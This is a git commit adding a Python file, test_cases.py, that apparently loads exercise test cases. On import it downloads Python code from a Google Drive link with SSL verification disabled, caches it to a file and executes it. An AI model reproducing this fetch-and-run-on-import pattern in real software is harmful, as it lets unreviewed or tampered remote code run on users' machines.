c8cd73620f78f39b3ecddd633dfa214e688749a6
KisAwesome <cool676rock@gmail.com>
2024-02-26 13:59:36 +0400

    initial commit

---
+++ test_cases.py
@@ -0,0 +1,41 @@
+def retrieve_test():
+    def load_func(func):
+        globals()["test"] = func
+
+    import os
+
+    if os.path.exists(os.path.join(os.path.dirname(__file__), "test_cases_cache.py")):
+        from test_cases_cache import test
+
+        load_func(test)
+
+    else:
+        import urllib.request
+        import ssl
+
+        url = "https://drive.google.com/uc?id=1k6Gy1DUzFEhco-6MCDUEe--Cc31K260Z"
+
+        with urllib.request.urlopen(
+            url, context=ssl._create_unverified_context()
+        ) as response:
+            if response.status == 200:
+
+                content = response.read().decode("utf-8")
+
+                with open(
+                    os.path.join(os.path.dirname(__file__), "test_cases_cache.py"),
+                    "w",
+                    encoding="utf-8",
+                ) as file:
+                    file.write(content)
+            else:
+                print("Error please ask for help")
+                return
+
+        from test_cases_cache import test
+
+        load_func(test)
+
+
+retrieve_test()
+
